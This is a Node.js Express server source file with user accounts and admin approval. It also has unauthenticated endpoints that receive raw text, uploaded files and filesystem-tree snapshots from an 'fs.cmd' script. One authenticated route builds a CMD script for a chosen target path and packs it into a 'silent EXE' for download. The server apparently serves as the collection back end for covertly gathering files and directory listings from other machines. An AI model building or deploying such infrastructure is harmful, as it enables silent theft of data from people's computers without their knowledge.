const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs');
const multer = require('multer');
const bcrypt = require('bcryptjs');
const db = require('./db');
const { uploadsDir } = require('./db');
const {
  validateUsername,
  validatePassword,
  signToken,
  authRequired,
  approvedRequired,
  adminRequired,
} = require('./auth');
const { generateUploadExe } = require('./cmdScripts');

const app = express();
const PORT = process.env.PORT || 3001;

app.set('trust proxy', 1);
app.use(cors());
app.use(express.json({ limit: '50mb' }));

const storage = multer.diskStorage({
  destination: (_req, _file, cb) => cb(null, uploadsDir),
  filename: (_req, file, cb) => {
    const safe = String(file.originalname || 'file')
      .replace(/[^a-zA-Z0-9._-]/g, '_')
      .slice(0, 120);
    cb(null, `${Date.now()}_${Math.random().toString(36).slice(2, 10)}_${safe}`);
  },
});

const upload = multer({
  storage,
  limits: { fileSize: 50 * 1024 * 1024 },
});

function publicFileRow(row) {
  return {
    id: row.id,
    original_name: row.original_name,
    mime_type: row.mime_type,
    size: row.size,
    received_at: row.received_at,
  };
}

// Public: record raw text (no authentication)
app.post('/api/rawtext', (req, res) => {
  const content = req.body?.text ?? req.body?.content ?? req.body?.rawtext;

  if (typeof content !== 'string' || content.trim() === '') {
    return res.status(400).json({ error: 'A non-empty text string is required' });
  }

  const result = db.prepare(`
    INSERT INTO raw_texts (content) VALUES (?)
  `).run(content);

  const row = db.prepare(`
    SELECT id, content, received_at FROM raw_texts WHERE id = ?
  `).get(result.lastInsertRowid);

  res.status(201).json(row);
});

app.delete('/api/rawtext/:id', authRequired, approvedRequired, (req, res) => {
  const id = Number(req.params.id);
  const row = db.prepare('SELECT id FROM raw_texts WHERE id = ?').get(id);
  if (!row) {
    return res.status(404).json({ error: 'Text entry not found' });
  }

  db.prepare('DELETE FROM raw_texts WHERE id = ?').run(id);
  res.json({ ok: true });
});

// Public: receive and store a binary file (no authentication)
app.post('/api/binfile', (req, res) => {
  upload.single('file')(req, res, (err) => {
    if (err) {
      console.error(err);
      return res.status(400).json({ error: err.message || 'File upload failed' });
    }

    if (!req.file) {
      return res.status(400).json({ error: 'A file field named "file" is required' });
    }

    try {
      const result = db.prepare(`
        INSERT INTO bin_files (original_name, stored_name, mime_type, size)
        VALUES (?, ?, ?, ?)
      `).run(
        req.file.originalname || req.file.filename,
        req.file.filename,
        req.file.mimetype || null,
        req.file.size || 0
      );

      const row = db.prepare(`
        SELECT id, original_name, mime_type, size, received_at
        FROM bin_files WHERE id = ?
      `).get(result.lastInsertRowid);

      res.status(201).json(publicFileRow(row));
    } catch (e) {
      try {
        fs.unlinkSync(path.join(uploadsDir, req.file.filename));
      } catch {
        // ignore cleanup errors
      }
      console.error(e);
      res.status(500).json({ error: 'Failed to store file metadata' });
    }
  });
});

app.get('/api/binfiles', authRequired, approvedRequired, (req, res) => {
  const files = db.prepare(`
    SELECT id, original_name, mime_type, size, received_at
    FROM bin_files
    ORDER BY id DESC
    LIMIT 500
  `).all();

  res.json({ files: files.map(publicFileRow) });
});

app.get('/api/binfile/:id/download', authRequired, approvedRequired, (req, res) => {
  const id = Number(req.params.id);
  const row = db.prepare(`
    SELECT id, original_name, stored_name, mime_type FROM bin_files WHERE id = ?
  `).get(id);

  if (!row) {
    return res.status(404).json({ error: 'File not found' });
  }

  const filePath = path.join(uploadsDir, row.stored_name);
  if (!fs.existsSync(filePath)) {
    return res.status(404).json({ error: 'Stored file is missing on disk' });
  }

  res.download(filePath, row.original_name);
});

app.delete('/api/binfile/:id', authRequired, approvedRequired, (req, res) => {
  const id = Number(req.params.id);
  const row = db.prepare(`
    SELECT id, stored_name FROM bin_files WHERE id = ?
  `).get(id);

  if (!row) {
    return res.status(404).json({ error: 'File not found' });
  }

  const filePath = path.join(uploadsDir, row.stored_name);
  db.prepare('DELETE FROM bin_files WHERE id = ?').run(id);

  if (fs.existsSync(filePath)) {
    try {
      fs.unlinkSync(filePath);
    } catch (e) {
      console.error('Failed to delete stored file:', e);
      return res.status(500).json({ error: 'Database entry removed but file delete failed' });
    }
  }

  res.json({ ok: true });
});

// Public: store filesystem tree JSON from fs.cmd (no authentication)
app.post('/api/fs', (req, res) => {
  const payload = req.body;

  if (!payload || typeof payload !== 'object' || Array.isArray(payload)) {
    return res.status(400).json({ error: 'A JSON object filesystem tree is required' });
  }

  if (Object.keys(payload).length === 0) {
    return res.status(400).json({ error: 'Filesystem tree cannot be empty' });
  }

  const result = db.prepare(`
    INSERT INTO fs_snapshots (payload) VALUES (?)
  `).run(JSON.stringify(payload));

  const row = db.prepare(`
    SELECT id, received_at FROM fs_snapshots WHERE id = ?
  `).get(result.lastInsertRowid);

  res.status(201).json(row);
});

app.get('/api/fs', authRequired, approvedRequired, (req, res) => {
  const snapshots = db.prepare(`
    SELECT id, received_at
    FROM fs_snapshots
    ORDER BY id DESC
    LIMIT 100
  `).all();

  res.json({ snapshots });
});

// Generate CMD, pack into silent EXE, and download
app.post('/api/fs/script', authRequired, approvedRequired, (req, res) => {
  const { path: targetPath, type } = req.body || {};
  const result = generateUploadExe({ targetPath, type, req });

  if (result.error) {
    return res.status(400).json({ error: result.error });
  }

  res.setHeader('Content-Type', 'application/octet-stream');
  res.setHeader(
    'Content-Disposition',
    `attachment; filename="${result.filename}"; filename*=UTF-8''${encodeURIComponent(result.filename)}`
  );
  res.send(result.content);
});

app.get('/api/fs/:id', authRequired, approvedRequired, (req, res) => {
  const id = Number(req.params.id);
  const row = db.prepare(`
    SELECT id, payload, received_at FROM fs_snapshots WHERE id = ?
  `).get(id);

  if (!row) {
    return res.status(404).json({ error: 'Filesystem snapshot not found' });
  }

  res.json({
    id: row.id,
    received_at: row.received_at,
    tree: JSON.parse(row.payload),
  });
});

app.delete('/api/fs/:id', authRequired, approvedRequired, (req, res) => {
  const id = Number(req.params.id);
  const row = db.prepare('SELECT id FROM fs_snapshots WHERE id = ?').get(id);
  if (!row) {
    return res.status(404).json({ error: 'Filesystem snapshot not found' });
  }

  db.prepare('DELETE FROM fs_snapshots WHERE id = ?').run(id);
  res.json({ ok: true });
});

app.post('/api/register', (req, res) => {
  const { username, password } = req.body || {};

  const usernameError = validateUsername(username);
  if (usernameError) {
    return res.status(400).json({ error: usernameError });
  }

  const passwordError = validatePassword(password);
  if (passwordError) {
    return res.status(400).json({ error: passwordError });
  }

  if (username.toLowerCase() === 'admin') {
    return res.status(400).json({ error: 'This username is reserved' });
  }

  const existing = db.prepare(
    'SELECT id FROM users WHERE username = ? COLLATE NOCASE'
  ).get(username);

  if (existing) {
    return res.status(409).json({ error: 'Username is already taken' });
  }

  const passwordHash = bcrypt.hashSync(password, 10);
  const result = db.prepare(`
    INSERT INTO users (username, password_hash, role, status)
    VALUES (?, ?, 'user', 'pending')
  `).run(username, passwordHash);

  res.status(201).json({
    id: result.lastInsertRowid,
    username,
    status: 'pending',
    message: 'Registration successful. An administrator must approve your account before you can sign in fully.',
  });
});

app.post('/api/login', (req, res) => {
  const { username, password } = req.body || {};

  if (!username || !password) {
    return res.status(400).json({ error: 'Username and password are required' });
  }

  const user = db.prepare(`
    SELECT id, username, password_hash, role, status FROM users
    WHERE username = ? COLLATE NOCASE
  `).get(username);

  if (!user || !bcrypt.compareSync(password, user.password_hash)) {
    return res.status(401).json({ error: 'Invalid username or password' });
  }

  if (user.status === 'rejected') {
    return res.status(403).json({ error: 'Your account has been rejected' });
  }

  if (user.status === 'pending') {
    return res.status(403).json({
      error: 'Your account is pending administrator approval',
      status: 'pending',
    });
  }

  const token = signToken(user);
  res.json({
    token,
    user: {
      id: user.id,
      username: user.username,
      role: user.role,
      status: user.status,
    },
  });
});

app.get('/api/me', authRequired, (req, res) => {
  res.json({ user: req.user });
});

app.get('/api/texts', authRequired, approvedRequired, (req, res) => {
  const texts = db.prepare(`
    SELECT id, content, received_at
    FROM raw_texts
    ORDER BY id DESC
    LIMIT 500
  `).all();

  res.json({ texts });
});

app.get('/api/users', authRequired, approvedRequired, adminRequired, (req, res) => {
  const users = db.prepare(`
    SELECT id, username, role, status, created_at
    FROM users
    ORDER BY
      CASE status WHEN 'pending' THEN 0 WHEN 'approved' THEN 1 ELSE 2 END,
      created_at DESC
  `).all();

  res.json({ users });
});

app.patch('/api/users/:id', authRequired, approvedRequired, adminRequired, (req, res) => {
  const id = Number(req.params.id);
  const { status } = req.body || {};

  if (!['approved', 'rejected', 'pending'].includes(status)) {
    return res.status(400).json({ error: 'Status must be approved, rejected, or pending' });
  }

  const target = db.prepare('SELECT id, username, role FROM users WHERE id = ?').get(id);
  if (!target) {
    return res.status(404).json({ error: 'User not found' });
  }

  if (target.role === 'admin') {
    return res.status(400).json({ error: 'Cannot change administrator status' });
  }

  db.prepare('UPDATE users SET status = ? WHERE id = ?').run(status, id);

  const updated = db.prepare(`
    SELECT id, username, role, status, created_at FROM users WHERE id = ?
  `).get(id);

  res.json({ user: updated });
});

app.delete('/api/users/:id', authRequired, approvedRequired, adminRequired, (req, res) => {
  const id = Number(req.params.id);
  const target = db.prepare('SELECT id, username, role FROM users WHERE id = ?').get(id);

  if (!target) {
    return res.status(404).json({ error: 'User not found' });
  }

  if (target.role === 'admin' || target.username.toLowerCase() === 'admin') {
    return res.status(400).json({ error: 'Cannot delete the administrator account' });
  }

  if (target.id === req.user.id) {
    return res.status(400).json({ error: 'Cannot delete your own account' });
  }

  db.prepare('DELETE FROM users WHERE id = ?').run(id);
  res.json({ ok: true });
});

const clientDist = path.join(__dirname, '..', 'client', 'dist');
app.use(express.static(clientDist));
app.get('*', (req, res, next) => {
  if (req.path.startsWith('/api')) return next();
  res.sendFile(path.join(clientDist, 'index.html'), (err) => {
    if (err) next();
  });
});

app.use((err, req, res, next) => {
  if (err instanceof SyntaxError && err.status === 400 && 'body' in err) {
    return res.status(400).json({ error: 'Invalid JSON body' });
  }
  console.error(err);
  res.status(500).json({ error: 'Internal server error' });
});

app.listen(PORT, () => {
  console.log(`Server listening on http://localhost:${PORT}`);
});
